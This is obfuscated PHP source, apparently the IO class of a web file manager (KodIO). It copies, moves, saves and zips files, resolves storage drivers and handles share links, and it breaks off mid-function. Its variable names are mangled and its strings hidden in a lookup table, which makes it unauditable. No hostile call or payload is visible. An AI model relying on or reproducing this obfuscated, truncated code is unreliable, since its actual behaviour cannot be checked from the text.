<?php
 goto bĞµ–«ÚìÁ; aëØ‰‹ŸÃ: class IO extends ClassBaseCall { public static $driverCache = array(); public static $driverListSystem = array(); public static $driverListUser = array(); public static function __callStatic($èÉ½’§, $´éé™¦Ç) { $£÷Æ½“À =& $_SERVER[ÕŸ²ó÷å]; $ÅÅ¾Ñ¨ = $´éé™¦Ç; $GLOBALS[$£÷Æ½“À[1230]] = $£÷Æ½“À[1231] . $èÉ½’§; Hook::trigger($£÷Æ½“À[1231] . $èÉ½’§ . $£÷Æ½“À[1232], $ÅÅ¾Ñ¨); $ÀœˆøçË = self::driverMake($´éé™¦Ç[0]); if (!$ÀœˆøçË) { return !1; } if (method_exists($ÀœˆøçË, $èÉ½’§)) { $Ñ¤Œ¶İ¶ = @call_user_func_array(array($ÀœˆøçË, $èÉ½’§), $´éé™¦Ç); } else { if (method_exists($ÀœˆøçË, $£÷Æ½“À[1233])) { $Ñ¤Œ¶İ¶ = @call_user_func_array(array($ÀœˆøçË, $èÉ½’§), $´éé™¦Ç); } else { if (method_exists(self, $èÉ½’§)) { $Ñ¤Œ¶İ¶ = @call_user_func_array(array(self, $èÉ½’§), $´éé™¦Ç); } else { $Ñ¤Œ¶İ¶ = call_user_func_array(array(parent, $èÉ½’§), $´éé™¦Ç); } } } Hook::trigger($£÷Æ½“À[1231] . $èÉ½’§ . $£÷Æ½“À[1234], $ÅÅ¾Ñ¨, $Ñ¤Œ¶İ¶); return $Ñ¤Œ¶İ¶; } public static function init($ãÈ¿²Äî) { return self::driverMake($ãÈ¿²Äî); } public static function copy($Õ¯»×ü¸, $ÙüöäÌ×, $©Á¶ «Ç = false, $Óå‹†ñ– = false) { return self::copyMoveStart($Õ¯»×ü¸, $ÙüöäÌ×, $©Á¶ «Ç, $_SERVER[ÕŸ²ó÷å][627], $Óå‹†ñ–); } public static function move($Õ¥úßÔó, $áĞİªéê, $üÅ»ê„ = false, $ñöš‚÷á = false) { return self::copyMoveStart($Õ¥úßÔó, $áĞİªéê, $üÅ»ê„, $_SERVER[ÕŸ²ó÷å][629], $ñöš‚÷á); } private static function copyMoveStart($·Ó„Ÿ‡£, $ŞƒÉ…òğ, $éö•Å¦’, $»Æ£®ßİ, $’´ÎĞİÄ) { $›æ‘²÷ =& $_SERVER[ÕŸ²ó÷å]; $Ã¼èŸæÌ = array($·Ó„Ÿ‡£, $ŞƒÉ…òğ, $éö•Å¦’, $’´ÎĞİÄ); Hook::trigger($›æ‘²÷[1231] . $»Æ£®ßİ . $›æ‘²÷[1232], $Ã¼èŸæÌ); $Í¹şõÍü = self::copyMove($·Ó„Ÿ‡£, $ŞƒÉ…òğ, $éö•Å¦’, $»Æ£®ßİ, $’´ÎĞİÄ); Hook::trigger($›æ‘²÷[1231] . $»Æ£®ßİ . $›æ‘²÷[1234], $Ã¼èŸæÌ, $Í¹şõÍü); return $Í¹şõÍü; } public static function saveFile($òå ŞîÏ, $¸±éÊˆÒ, $¸¦âäÆœ = true) { $®¿„ßÊÔ =& $_SERVER[ÕŸ²ó÷å]; $ÂÓËÇ®Ü = self::info($¸±éÊˆÒ); $‡É¥ˆÒ› = self::driverMake($òå ŞîÏ); $é­»ˆò = self::driverMake($¸±éÊˆÒ); $ôèûğ¨ = !1; if ($é­»ˆò->pathParse[$®¿„ßÊÔ[1235]]) { $ôèûğ¨ = $é­»ˆò; $¢ìØĞß² = $é­»ˆò->pathParse[$®¿„ßÊÔ[1235]]; $é­»ˆò = self::driverMake($¢ìØĞß²); } if ($‡É¥ˆÒ›->pathParse[$®¿„ßÊÔ[1235]]) { $à‘Ëşæ— = $‡É¥ˆÒ›->pathParse[$®¿„ßÊÔ[1235]]; $‡É¥ˆÒ› = self::driverMake($à‘Ëşæ—); } $û³èŠ¦º = $é­»ˆò->pathFather($¸±éÊˆÒ); $èÛ›»ƒÄ = !0; if (!$¸¦âäÆœ && self::driverIsSame($‡É¥ˆÒ›, $é­»ˆò)) { $èÛ›»ƒÄ = !1; } $éÛİ¯çü = self::copyFile($‡É¥ˆÒ›, $òå ŞîÏ, $é­»ˆò, $û³èŠ¦º, $ÂÓËÇ®Ü[$®¿„ßÊÔ[32]], $èÛ›»ƒÄ); if ($ôèûğ¨) { $éÛİ¯çü = $ôèûğ¨->getPathOuter($éÛİ¯çü); } return $éÛİ¯çü; } private static function copyMove($ÄÁ†öé¬, $Ú¬ú±êµ, $È°çÀ×è, $–¥ñç¸¶, $–öÜñÊø = false) { $ë‘»ÏÍê =& $_SERVER[ÕŸ²ó÷å]; if (!$ÄÁ†öé¬ || $ÄÁ†öé¬ == $ë‘»ÏÍê[8] || !$Ú¬ú±êµ) { return !1; } ignore_timeout(); $àœŸ¨Ş = self::driverMake($ÄÁ†öé¬); $ñ¢èïÚ = self::driverMake($Ú¬ú±êµ); $ÂÚŸâû = $–¥ñç¸¶ == $ë‘»ÏÍê[629]; $îôïúóª = !1; if ($ñ¢èïÚ->pathParse[$ë‘»ÏÍê[1235]]) { $îôïúóª = $ñ¢èïÚ; $Ú¬ú±êµ = $ñ¢èïÚ->pathParse[$ë‘»ÏÍê[1235]]; $ñ¢èïÚ = self::driverMake($Ú¬ú±êµ); } if ($àœŸ¨Ş->pathParse[$ë‘»ÏÍê[1235]]) { $ÄÁ†öé¬ = $àœŸ¨Ş->pathParse[$ë‘»ÏÍê[1235]]; $àœŸ¨Ş = self::driverMake($ÄÁ†öé¬); } self::check($àœŸ¨Ş, $ÄÁ†öé¬, $ñ¢èïÚ, $Ú¬ú±êµ); Hook::trigger($ë‘»ÏÍê[1236], $àœŸ¨Ş, $ÄÁ†öé¬, $ñ¢èïÚ, $Ú¬ú±êµ); $«·•ü¦Û = self::driverIsSame($àœŸ¨Ş, $ñ¢èïÚ); if ($«·•ü¦Û) { if ($–¥ñç¸¶ == $ë‘»ÏÍê[629] && !method_exists($ñ¢èïÚ, $ë‘»ÏÍê[1237]) && trim($Ú¬ú±êµ, $ë‘»ÏÍê[8]) == trim($ñ¢èïÚ->pathFather($ÄÁ†öé¬), $ë‘»ÏÍê[8])) { if ($àœŸ¨Ş->pathThis($ÄÁ†öé¬) != $–öÜñÊø && !$àœŸ¨Ş->isOsDriver()) { return $àœŸ¨Ş->rename($ÄÁ†öé¬, $–öÜñÊø); } return $ñ¢èïÚ->getPathOuter($ÄÁ†öé¬); } if (method_exists($ñ¢èïÚ, $–¥ñç¸¶)) { return $ñ¢èïÚ->{$–¥ñç¸¶}($ÄÁ†öé¬, $Ú¬ú±êµ, $È°çÀ×è, $–öÜñÊø); } } if ($«·•ü¦Û && $–¥ñç¸¶ == $ë‘»ÏÍê[629] && $ñ¢èïÚ->getType() == $ë‘»ÏÍê[119]) { $ÜÓîêè— = $ñ¢èïÚ->movePath($ÄÁ†öé¬, $Ú¬ú±êµ, $–öÜñÊø); if ($ÜÓîêè—) { return $ÜÓîêè—; } } $Ú†ò‘Ÿå = $àœŸ¨Ş->isFile($ÄÁ†öé¬); if (!$Ú†ò‘Ÿå && $ñ¢èïÚ->getType() == $ë‘»ÏÍê[841] && $àœŸ¨Ş->getType() == $ë‘»ÏÍê[119]) { $ÜÓîêè— = $ñ¢èïÚ->copyFolderFromIO($àœŸ¨Ş, $ÄÁ†öé¬, $Ú¬ú±êµ, $È°çÀ×è, $ÂÚŸâû, $–öÜñÊø); } else { $ÜÓîêè— = self::copyPath($àœŸ¨Ş, $ÄÁ†öé¬, $ñ¢èïÚ, $Ú¬ú±êµ, $È°çÀ×è, $ÂÚŸâû, $Ú†ò‘Ÿå, $–öÜñÊø); } if ($ÜÓîêè— && $ÂÚŸâû) { $àœŸ¨Ş->remove($ÄÁ†öé¬); } if ($îôïúóª) { $ÜÓîêè— = $îôïúóª->getPathOuter($ÜÓîêè—); } return $ÜÓîêè—; } private static function check($¢¹»ıå•, $İ±Ä›Ê‡, $Í“¾’Œë, &$ŸÜÄ¤µÓ) { $¥ñ‚›¥‹ =& $_SERVER[ÕŸ²ó÷å]; if (self::driverIsSame($¢¹»ıå•, $Í“¾’Œë) && $¢¹»ıå•->isFolder($İ±Ä›Ê‡) && $¢¹»ıå•->isParentOf($İ±Ä›Ê‡, $ŸÜÄ¤µÓ)) { show_json(LNG($¥ñ‚›¥‹[1238]), !1); } if (!$¢¹»ıå•->exist($İ±Ä›Ê‡)) { show_json(LNG($¥ñ‚›¥‹[118]), !1); } } private static function copyPath($å·ÆÃ¢¼, $½ÁÑˆåñ, $ÆÕ°­›„, $£æùúùË, $€¹óáåˆ, $¼¢ùªª×, $Õõæ™ô˜, $¿ˆÏŞ´ = false, $¢ÕÈ‘×Ò = true) { $£şêÏü© =& $_SERVER[ÕŸ²ó÷å]; $¾î¬Ò = empty($¿ˆÏŞ´) && $¿ˆÏŞ´ !== $£şêÏü©[238] ? $å·ÆÃ¢¼->pathThis($½ÁÑˆåñ) : $¿ˆÏŞ´; if ($€¹óáåˆ) { $ãëóŒ½û = $ÆÕ°­›„->fileNameExist($£æùúùË, $¾î¬Ò); $ÓÆµ‡è» = $¾î¬Ò; $¾î¬Ò = $ÆÕ°­›„->fileNameAuto($£æùúùË, $¾î¬Ò, $€¹óáåˆ, !$Õõæ™ô˜); if (!$ãëóŒ½û || $ÓÆµ‡è» != $¾î¬Ò) { $€¹óáåˆ = !1; } if ($¢ÕÈ‘×Ò && !$€¹óáåˆ) { $ÆÕ°­›„->_data[$£şêÏü©[1239]] = !0; } } if ($Õõæ™ô˜) { return self::copyFile($å·ÆÃ¢¼, $½ÁÑˆåñ, $ÆÕ°­›„, $£æùúùË, $¾î¬Ò, $¼¢ùªª×); } if ($€¹óáåˆ == REPEAT_RENAME_FOLDER) { $€¹óáåˆ = !1; } $úˆÌÓ¶– = rtrim($£æùúùË, $£şêÏü©[8]) . $£şêÏü©[8] . $¾î¬Ò; $ç¬şï… = $ÆÕ°­›„->mkdir($ÆÕ°­›„->getPath($úˆÌÓ¶–), $€¹óáåˆ); $£æùúùË = $ÆÕ°­›„->getPathInner($ç¬şï…); $êšİ‡› = $å·ÆÃ¢¼->listPath($½ÁÑˆåñ, !0); $êšİ‡› = is_array($êšİ‡›) ? $êšİ‡› : array($£şêÏü©[96] => array(), $£şêÏü©[95] => array()); $„¶ŸÓô = array_merge($êšİ‡›[$£şêÏü©[96]], $êšİ‡›[$£şêÏü©[95]]); foreach ($„¶ŸÓô as $«¡Ï‡ò’) { $Ãâ‹•ÅĞ = $«¡Ï‡ò’[$£şêÏü©[33]] == $£şêÏü©[240]; $½ÁÑˆåñ = $å·ÆÃ¢¼->getPathInner($«¡Ï‡ò’[$£şêÏü©[97]]); $âá©•Ï = self::copyPath($å·ÆÃ¢¼, $½ÁÑˆåñ, $ÆÕ°­›„, $£æùúùË, $€¹óáåˆ, $¼¢ùªª×, $Ãâ‹•ÅĞ, !1, !1); if (!$âá©•Ï) { IO::errorTips($£şêÏü©[1240] . $½ÁÑˆåñ . $£şêÏü©[83] . $£æùúùË); } } self::copyMoveKeepInfo($å·ÆÃ¢¼, $½ÁÑˆåñ, $ç¬şï…); return $ç¬şï…; } private static function copyFile($©×Ş¾—, $ĞÚâ½Ìİ, $Ë—¤‰Š, $Ê¸ö´ ö, $Ïò õÈ, $ÙÉÈ†œı) { $õ éæÕ« =& $_SERVER[ÕŸ²ó÷å]; $Ê¸ö´ ö = $Ë—¤‰Š->getPath(rtrim($Ê¸ö´ ö, $õ éæÕ«[8]) . $õ éæÕ«[8] . $Ïò õÈ); $Û¾¶ˆÕæ = $õ éæÕ«[1241] . time() . rand_string(5); Hook::trigger($õ éæÕ«[1242], $©×Ş¾—, $ĞÚâ½Ìİ, $Ë—¤‰Š, $Ê¸ö´ ö, $Ïò õÈ, $Û¾¶ˆÕæ); if (self::driverIsSame($©×Ş¾—, $Ë—¤‰Š)) { if ($ÙÉÈ†œı) { $Ó¿ª€„İ = $Ë—¤‰Š->moveFile($ĞÚâ½Ìİ, $Ê¸ö´ ö); } else { $Ó¿ª€„İ = $Ë—¤‰Š->copyFile($ĞÚâ½Ìİ, $Ê¸ö´ ö); } Hook::trigger($õ éæÕ«[1243], $©×Ş¾—, $ĞÚâ½Ìİ, $Ë—¤‰Š, $Ê¸ö´ ö, $Ïò õÈ, $Ó¿ª€„İ); self::copyMoveKeepInfo($©×Ş¾—, $ĞÚâ½Ìİ, $Ó¿ª€„İ); return $Ó¿ª€„İ; } $šÂìóêÀ = TEMP_FILES; if ($GLOBALS[$õ éæÕ«[6]][$õ éæÕ«[102]][$õ éæÕ«[880]]) { $šÂìóêÀ = $GLOBALS[$õ éæÕ«[6]][$õ éæÕ«[102]][$õ éæÕ«[880]]; } $ÒÜ×äÁº = $šÂìóêÀ; mk_dir($ÒÜ×äÁº); $ˆ¬ÇµÍİ = $ÒÜ×äÁº . $Û¾¶ˆÕæ; $­©‚Ë°Ú = $ˆ¬ÇµÍİ; $ˆ¬ÇµÍİ = $©×Ş¾—->download($ĞÚâ½Ìİ, $ˆ¬ÇµÍİ); $ˆ¬ÇµÍİ = $©×Ş¾—->iconvApp($ˆ¬ÇµÍİ); if (substr($ˆ¬ÇµÍİ, strlen($šÂìóêÀ)) == $šÂìóêÀ) { $ÙÉÈ†œı = !0; } $Ó¿ª€„İ = $Ë—¤‰Š->upload($Ê¸ö´ ö, $ˆ¬ÇµÍİ, $ÙÉÈ†œı); self::remove($­©‚Ë°Ú); Hook::trigger($õ éæÕ«[1243], $©×Ş¾—, $ĞÚâ½Ìİ, $Ë—¤‰Š, $Ê¸ö´ ö, $Ïò õÈ, $Ó¿ª€„İ); self::copyMoveKeepInfo($©×Ş¾—, $ĞÚâ½Ìİ, $Ó¿ª€„İ); return $Ó¿ª€„İ; } private static function copyMoveKeepInfo($áÁçßÜ, $‹„î¥…ö, $Ğ»ã¥í†) { if (!$Ğ»ã¥í†) { return; } $ßìåÊÀÁ = $áÁçßÜ->info($‹„î¥…ö); if (!is_array($ßìåÊÀÁ)) { return; } IO::setModifyTime($Ğ»ã¥í†, $ßìåÊÀÁ[$_SERVER[ÕŸ²ó÷å][98]]); } public static function pathFather($ò¯åì÷ƒ) { $Áµ’Ò£ = IO::init($ò¯åì÷ƒ); $ì¬ú»ş² = $Áµ’Ò£->pathFather($Áµ’Ò£->path); return $Áµ’Ò£->getPathOuter($ì¬ú»ş²); } public static function fileOut($‹ä¯¸º½, $µ’ô¬Ÿá = false, $×ÀÀ¼Ú = false, $ ¾ç“¸ù = '') { $±ºÇ³ûÙ = self::driverMake($‹ä¯¸º½); if ($±ºÇ³ûÙ->isFileOutServer()) { return $±ºÇ³ûÙ->fileOutServer($‹ä¯¸º½, $µ’ô¬Ÿá, $×ÀÀ¼Ú, $ ¾ç“¸ù); } return $±ºÇ³ûÙ->fileOut($‹ä¯¸º½, $µ’ô¬Ÿá, $×ÀÀ¼Ú, $ ¾ç“¸ù); } public static function fileOutImage($Îö›¤çƒ, $ˆ€»»öÔ = 250) { $ò‰øë¡ = array(250, 600, 1200, 2000, 3000, 5000); for ($ş‹™¬ˆÕ = 0; $ş‹™¬ˆÕ < count($ò‰øë¡); $ş‹™¬ˆÕ++) { if ($ş‹™¬ˆÕ == 0 && $ˆ€»»öÔ <= $ò‰øë¡[$ş‹™¬ˆÕ]) { $ˆ€»»öÔ = $ò‰øë¡[$ş‹™¬ˆÕ]; break; } else { if ($ˆ€»»öÔ > $ò‰øë¡[$ş‹™¬ˆÕ - 1] && $ˆ€»»öÔ <= $ò‰øë¡[$ş‹™¬ˆÕ]) { $ˆ€»»öÔ = $ò‰øë¡[$ş‹™¬ˆÕ]; break; } else { if ($ş‹™¬ˆÕ == count($ò‰øë¡) - 1 && $ˆ€»»öÔ > $ò‰øë¡[$ş‹™¬ˆÕ]) { $ˆ€»»öÔ = $ò‰øë¡[$ş‹™¬ˆÕ]; break; } } } } $Ìí”­‹™ = self::driverMake($Îö›¤çƒ); if ($Ìí”­‹™->isFileOutServer()) { return $Ìí”­‹™->fileOutImageServer($Îö›¤çƒ, $ˆ€»»öÔ); } return $Ìí”­‹™->fileOutImage($Îö›¤çƒ, $ˆ€»»öÔ); } private static function driverIsSame($Àøà…íß, $í¬ƒâöÁ) { $±¤ƒØ×© =& $_SERVER[ÕŸ²ó÷å]; $Ü¥Ä¦øÏ = $Àøà…íß->getType(); $›İ¯Ú¦ì = $í¬ƒâöÁ->getType(); if ($Ü¥Ä¦øÏ != $›İ¯Ú¦ì) { return !1; } if ($Ü¥Ä¦øÏ == $±¤ƒØ×©[841]) { return !0; } if ($Ü¥Ä¦øÏ == $±¤ƒØ×©[119]) { return !0; } if ($Àøà…íß->pathDriver == $í¬ƒâöÁ->pathDriver) { return !0; } return !1; } public static function copyUpdate($ÜúØÏ»½, $¯à«£ş) { $üºŠØ =& $_SERVER[ÕŸ²ó÷å]; if (!IO::exist($ÜúØÏ»½)) { return !1; } if (!IO::exist($¯à«£ş)) { IO::mkdir($¯à«£ş); } $ÎŠ¾ü†‚ = array_to_keyvalue(self::listAllSimple($ÜúØÏ»½), $üºŠØ[97]); $¤Í¨è„ = array_to_keyvalue(self::listAllSimple($¯à«£ş), $üºŠØ[97]); $ÛÈÜÈŠµ = array(); $ÕÊ‹è„Ç = array(); foreach ($ÎŠ¾ü†‚ as $¯ÎÅÅä => $‚Ê›ïª) { if (isset($¤Í¨è„[$¯ÎÅÅä])) { if ($‚Ê›ïª[$üºŠØ[88]] == 1) { continue; } if ($¤Í¨è„[$¯ÎÅÅä][$üºŠØ[89]] == $‚Ê›ïª[$üºŠØ[89]]) { continue; } } if ($‚Ê›ïª[$üºŠØ[88]] == 1) { $ÕÊ‹è„Ç[] = $¯à«£ş . $üºŠØ[8] . trim($¯ÎÅÅä, $üºŠØ[8]); continue; } $«í†ì§ = strstr(trim($¯ÎÅÅä, $üºŠØ[8]), $üºŠØ[8]) ? get_path_father($¯ÎÅÅä) : $üºŠØ[12]; $ÛÈÜÈŠµ[] = array($üºŠØ[1244] => $‚Ê›ïª[$üºŠØ[99]], $üºŠØ[1245] => rtrim($¯à«£ş, $üºŠØ[8]) . $üºŠØ[8] . $«í†ì§, $üºŠØ[1246] => $‚Ê›ïª); } $±ë£Æİ = array($üºŠØ[240] => $ÛÈÜÈŠµ, $üºŠØ[88] => $ÕÊ‹è„Ç); Hook::trigger($üºŠØ[1247], $ÜúØÏ»½, $¯à«£ş, $±ë£Æİ); foreach ($ÕÊ‹è„Ç as $‚Ê›ïª) { IO::mkdir($‚Ê›ïª); } foreach ($ÛÈÜÈŠµ as $‚Ê›ïª) { IO::copy($‚Ê›ïª[$üºŠØ[1244]], $‚Ê›ïª[$üºŠØ[1245]], REPEAT_REPLACE); } } public static function fileSubstr($€šîï‰, $Šæˆá…ê, $îˆÙ™Ö± = false) { $÷–¡“–ó =& $_SERVER[ÕŸ²ó÷å]; $÷¼ÖÛ” = self::driverMake($€šîï‰); $šÆŒÕã“ = $÷¼ÖÛ”->size($€šîï‰); $¿ÓŞÙÓş = $Šæˆá…ê; $‡Ü‰ªŒá = $îˆÙ™Ö±; if ($Šæˆá…ê < 0) { $Šæˆá…ê = $šÆŒÕã“ + $Šæˆá…ê; } if ($îˆÙ™Ö± === !1) { $îˆÙ™Ö± = $šÆŒÕã“ - $Šæˆá…ê; } if ($Šæˆá…ê + $îˆÙ™Ö± > $šÆŒÕã“) { $îˆÙ™Ö± = $šÆŒÕã“ - $Šæˆá…ê; } if (!$šÆŒÕã“ && $÷¼ÖÛ”->getType() == $÷–¡“–ó[119] && !$÷¼ÖÛ”->exist($€šîï‰)) { $­¬Ò¨æ» = get_path_this($€šîï‰); $¢­§³ş™ = parse_url_query($­¬Ò¨æ»); if (is_array($¢­§³ş™) && isset($¢­§³ş™[$÷–¡“–ó[32]])) { $­¬Ò¨æ» = urldecode($¢­§³ş™[$÷–¡“–ó[32]]); } throw new Exception($÷–¡“–ó[1248] . LNG($÷–¡“–ó[1249]) . $÷–¡“–ó[1047] . clear_html($­¬Ò¨æ») . $÷–¡“–ó[12]); } if ($îˆÙ™Ö± <= 0) { return $÷–¡“–ó[12]; } if ($Šæˆá…ê < 0 || $Šæˆá…ê >= $šÆŒÕã“ || $îˆÙ™Ö± > 1024 * 1024 * 10) { throw new Exception("\146\x69\x6c\x65\x52\x65\141\x64\40\x65\x72\162\x6f\162\41\40\163\164\141\x72\x74\x3d{$Šæˆá…ê}\73\154\145\x6e\x67\x74\150\75{$îˆÙ™Ö±}\73\x20\x73\x69\x7a\145\x3d{$šÆŒÕã“}\73"); } $º¸öˆç® = $÷¼ÖÛ”->fileSubstr($€šîï‰, $Šæˆá…ê, $îˆÙ™Ö±); if (!$º¸öˆç® && $îˆÙ™Ö± && isset($GLOBALS[$÷–¡“–ó[1250]])) { throw new Exception($GLOBALS[$÷–¡“–ó[1250]][$÷–¡“–ó[1251]]); } return $º¸öˆç®; } private static function driverMake(&$öé»™æ) { $—§Ç€ñæ =& $_SERVER[ÕŸ²ó÷å]; $Ê…Ë—¼Ò = KodIO::parse($öé»™æ); if (!self::$driverListSystem) { $¬ÛùÑéÕ = Model($—§Ç€ñæ[851])->driverListSystem(); self::$driverListSystem = array_to_keyvalue($¬ÛùÑéÕ, $—§Ç€ñæ[484]); } if ($Ê…Ë—¼Ò[$—§Ç€ñæ[33]] == KodIO::KOD_IO && !self::$driverListSystem[$Ê…Ë—¼Ò[$—§Ç€ñæ[484]]]) { throw new Exception($—§Ç€ñæ[1252]); return !1; } $öé»™æ = $Ê…Ë—¼Ò[$—§Ç€ñæ[1253]]; $¸¢¥Ö± = self::driverGet($Ê…Ë—¼Ò, $öé»™æ); return $¸¢¥Ö±; } private static function driverGet($Ü¢£ç°Î, &$ûÊß„‹) { $ ¥˜´å =& $_SERVER[ÕŸ²ó÷å]; $Æûá¤ü = $Ü¢£ç°Î[$ ¥˜´å[1254]]; $ß™Š¾î = $Ü¢£ç°Î[$ ¥˜´å[484]]; switch ($Ü¢£ç°Î[$ ¥˜´å[33]]) { case KodIO::KOD_IO: $»åé…Çë = self::$driverListSystem[$ß™Š¾î]; break; case KodIO::KOD_SOURCE: $ûÊß„‹ = $ß™Š¾î . $ûÊß„‹; $»åé…Çë = array($ ¥˜´å[1255] => $ ¥˜´å[1256], $ ¥˜´å[6] => $Ü¢£ç°Î); break; case KodIO::KOD_USER_DRIVER: if (!self::$driverListUser) { $¥åä»ò = $GLOBALS[$ ¥˜´å[1257]]; self::$driverListUser = array_to_keyvalue($¥åä»ò, $ ¥˜´å[484]); } $»åé…Çë = self::$driverListUser[$ß™Š¾î]; break; case KodIO::KOD_SHARE_LINK: $»åé…Çë = array($ ¥˜´å[1255] => $ ¥˜´å[1258], $ ¥˜´å[6] => $Ü¢£ç°Î); $½è»õ’ˆ = Action($ ¥˜´å[1259])->sharePathInfo($Ü¢£ç°Î[$ ¥˜´å[97]]); $ûÊß„‹ = $½è»õ’ˆ[$ ¥˜´å[203]]; if (!$½è»õ’ˆ[$ ¥˜´å[203]]) { $î¥…àê© = Model($ ¥˜´å[673])->getInfo($½è»õ’ˆ[$ ¥˜´å[674]]); $ûÊß„‹ = KodIO::clear($î¥…àê©[$ ¥˜´å[1260]] . $Ü¢£ç°Î[$ ¥˜´å[1253]]); $Ü¢£ç°Î[$ ¥˜´å[569]] = $î¥…àê©; $Ü¢£ç°Î[$ ¥˜´å[1235]] = $ûÊß„‹; $»åé…Çë = array($ ¥˜´å[1255] => $ ¥˜´å[1261], $ ¥˜´å[6] => $Ü¢£ç°Î); } break; case KodIO::KOD_SHARE_ITEM: $»åé…Çë = array($ ¥˜´å[1255] => $ ¥˜´å[1262], $ ¥˜´å[6] => $Ü¢£ç°Î); $î¥…àê© = Model($ ¥˜´å[673])->getInfo($Ü¢£ç°Î[$ ¥˜´å[484]]); if ($î¥…àê©[$ ¥˜´å[203]] == $ ¥˜´å[238]) { $ûÊß„‹ = KodIO::clear($î¥…àê©[$ ¥˜´å[1260]] . $Ü¢£ç°Î[$ ¥˜´å[1253]]); $Ü¢£ç°Î[$ ¥˜´å[569]] = $î¥…àê©; $Ü¢£ç°Î[$ ¥˜´å[1235]] = $ûÊß„‹; $»åé…Çë = array($ ¥˜´å[1255] => $ ¥˜´å[1263], $ ¥˜´å[6] => $Ü¢£ç°Î); } else { if (!$ûÊß„‹) { $ûÊß„‹ = $î¥…àê©[$ ¥˜´å[203]]; } } break; default: $ûÊß„‹ = $Ü¢£ç°Î[$ ¥˜´å[97]]; $»åé…Çë = array($ ¥˜´å[1255] => $ ¥˜´å[1264]); break; } $º”¯İÊ¶ = $Ü¢£ç°Î[$ ¥˜´å[97]]; if (!isset(self::$driverCache[$º”¯İÊ¶])) { $”è–‘·ü = strtolower($»åé…Çë[$ ¥˜´å[108]]); $ŞÃ×îâŠ = $GLOBALS[$ ¥˜´å[6]][$ ¥˜´å[102]][$ ¥˜´å[909]]; $µªŠéï = $ ¥˜´å[87] . (isset($ŞÃ×îâŠ[$”è–‘·ü]) ? $ŞÃ×îâŠ[$”è–‘·ü] : ucfirst($”è–‘·ü)); if (!class_exists($µªŠéï)) { show_json("{$µªŠéï}\40\156\x6f\x74\x20\145\x78\151\163\164\x73\41", !1); } $¬‘â²Ô = isset($»åé…Çë[$ ¥˜´å[6]]) ? $»åé…Çë[$ ¥˜´å[6]] : !1; self::$driverCache[$º”¯İÊ¶] = new $µªŠéï($¬‘â²Ô); } $Ÿ¯½¹»ô = self::$driverCache[$º”¯İÊ¶]; $Ÿ¯½¹»ô->pathDriver = $Æûá¤ü; $Ÿ¯½¹»ô->pathBase = $ ¥˜´å[12]; if (isset($»åé…Çë[$ ¥˜´å[6]][$ ¥˜´å[1265]])) { $Ÿ¯½¹»ô->pathBase = rtrim($»åé…Çë[$ ¥˜´å[6]][$ ¥˜´å[1265]], $ ¥˜´å[8]) . $ ¥˜´å[8]; $ûÊß„‹ = $Ÿ¯½¹»ô->pathBase . ltrim($ûÊß„‹, $ ¥˜´å[8]); } $ûÊß„‹ = $Ÿ¯½¹»ô->getPath($ûÊß„‹); if (isset($Ü¢£ç°Î[$ ¥˜´å[1235]])) { $ûÊß„‹ = $Ü¢£ç°Î[$ ¥˜´å[1235]]; } $Ÿ¯½¹»ô->path = $ûÊß„‹; return $Ÿ¯½¹»ô; } public static function errorTips($ÃØ¶ıÄÇ = false) { $ùŞã¯ü¨ =& $_SERVER[ÕŸ²ó÷å]; static $Á¥½í = array(); $•º¢Â¼Â = 1000; if ($ÃØ¶ıÄÇ === -1) { return $Á¥½í ? $Á¥½í[count($Á¥½í) - 1] : $ùŞã¯ü¨[12]; } if ($ÃØ¶ıÄÇ === !1) { return implode($ùŞã¯ü¨[59], $Á¥½í); } if (count($Á¥½í) >= $•º¢Â¼Â) { $Á¥½í = array_slice($Á¥½í, $•º¢Â¼Â * 0.5, $•º¢Â¼Â); } $Á¥½í[] = $ÃØ¶ıÄÇ; write_log($ùŞã¯ü¨[186] . ACTION . $ùŞã¯ü¨[1266] . $ÃØ¶ıÄÇ, $ùŞã¯ü¨[1267]); } public static function getLastError($óÖãµÜ = '') { $½ó®Î·— = self::errorTips(-1); return $½ó®Î·— ? $½ó®Î·— : $óÖãµÜ; } } class IOArchive extends IO { function __construct() { parent::__construct(); } private static function local() { static $õ®ù¢óû; if ($õ®ù¢óû) { return $õ®ù¢óû; } $İáÕ‡„ = IO::init($_SERVER[ÕŸ²ó÷å][8]); return $İáÕ‡„; } private static function iconvSystem($Û¨¾ÅÈø) { return self::local()->iconvSystem($Û¨¾ÅÈø); } private static function iconvApp($éú†¦ °) { return self::local()->iconvApp($éú†¦ °); } public static function zipFolder($°ĞÄÍ¶Ù, $Œ€ßÃÚ = "\172\x69\x70", $ñ«ôºŠ… = '', $°¶÷Şâµ = REPEAT_RENAME) { $˜Ş Â®‰ =& $_SERVER[ÕŸ²ó÷å]; $•û¸Œ…— = IO::listPath($°ĞÄÍ¶Ù); if (!$•û¸Œ…—) { return !1; } $•û¸Œ…— = array_merge($•û¸Œ…—[$˜Ş Â®‰[95]], $•û¸Œ…—[$˜Ş Â®‰[96]]); return self::zip($•û¸Œ…—, $Œ€ßÃÚ, $ñ«ôºŠ…, $°¶÷Şâµ); } public static function zip($¬³îÔÚş, $æ©²Øº = "\172\x69\160", $ĞÒê±õ¹ = '', $äß¶¼£Š = REPEAT_RENAME) { $¨şŒ« =& $_SERVER[ÕŸ²ó÷å]; if (is_string($¬³îÔÚş) && $¬³îÔÚş) { $¬³îÔÚş = array(array($¨şŒ«[97] => $¬³îÔÚş)); } $Ï­ÈÁö° = self::init($¬³îÔÚş[0][$¨şŒ«[97]]); $ëÎ½ÁÏŒ = self::info($¬³îÔÚş[0][$¨şŒ«[97]]); $÷–‹¤ê = $¨şŒ«[12]; $¯‘Ü‚›Ø = $¨şŒ«[12]; $Òò´Ê¸ = $¨şŒ«[12]; if ($ĞÒê±õ¹ && substr($ĞÒê±õ¹, -1, 1) != $¨şŒ«[8]) { $¯‘Ü‚›Ø = get_path_father($ĞÒê±õ¹); $Òò´Ê¸ = get_path_this($ĞÒê±õ¹); } else { $¯‘Ü‚›Ø = self::pathFather($ëÎ½ÁÏŒ[$¨şŒ«[97]]); $Òò´Ê¸ = $ëÎ½ÁÏŒ[$¨şŒ«[32]] . $¨şŒ«[10] . $æ©²Øº; if (count($¬³îÔÚş) > 1) { $ ¸£«ÆÔ = IO::info($¯‘Ü‚›Ø); $Òò´Ê¸ = $ ¸£«ÆÔ[$¨şŒ«[32]] . $¨şŒ«[10] . $æ©²Øº; } if ($ĞÒê±õ¹) { $¯‘Ü‚›Ø = $ĞÒê±õ¹; } } if ($Ï­ÈÁö°->getType() == $¨şŒ«[119]) { $ŒÅÆ²ø€ = self::init($¯‘Ü‚›Ø); $½“ééÑ = 